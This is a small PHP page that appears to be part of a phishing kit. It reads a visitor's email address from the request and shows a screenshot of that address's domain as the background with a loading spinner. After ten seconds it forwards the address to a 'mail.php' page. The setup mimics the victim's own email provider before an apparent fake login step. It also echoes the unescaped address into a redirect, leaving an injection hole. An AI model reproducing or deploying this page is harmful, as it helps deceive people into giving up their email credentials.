<?php $email = $_REQUEST['email'];
      $domainx = substr($email, strpos($email, '@') + 1);
      $domain = strtoupper($domainx);
      ?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="10;url=mail.php?email=<?php echo $email; ?>" />

<style>
body{
            width:99%;
            height:100%;
            margin:0;
            padding:0;
			background-image:url(http://img.bitpixels.com/getthumbnail?code=68013&size=480&url=http://www.<?php echo $domain; ?>);
			background-repeat: no-repeat;
			background-size: cover;
        }
.loader {
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid #3498db;
  width: 120px;
  height: 120px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</head>
<body align='center'>

<div class="loader"></div>

</body>
</html>